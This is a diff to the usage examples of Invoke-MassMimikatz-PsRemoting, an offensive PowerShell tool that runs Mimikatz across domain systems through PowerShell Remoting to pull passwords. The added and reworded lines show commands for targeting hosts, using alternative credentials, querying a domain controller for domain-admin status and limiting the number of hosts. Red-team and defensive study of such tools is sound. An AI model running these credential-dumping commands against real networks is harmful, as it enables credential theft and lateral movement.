@@ -25,8 +25,11 @@ Command Examples
     # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
     Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”
 
-    # Run command as current domain user.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
-    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –DomainController 10.2.2.1 –Credential domain\user–AutoTarget -MaxHosts 1
+     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
+    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user
+
+    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
+    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1
 
     # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
     Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user
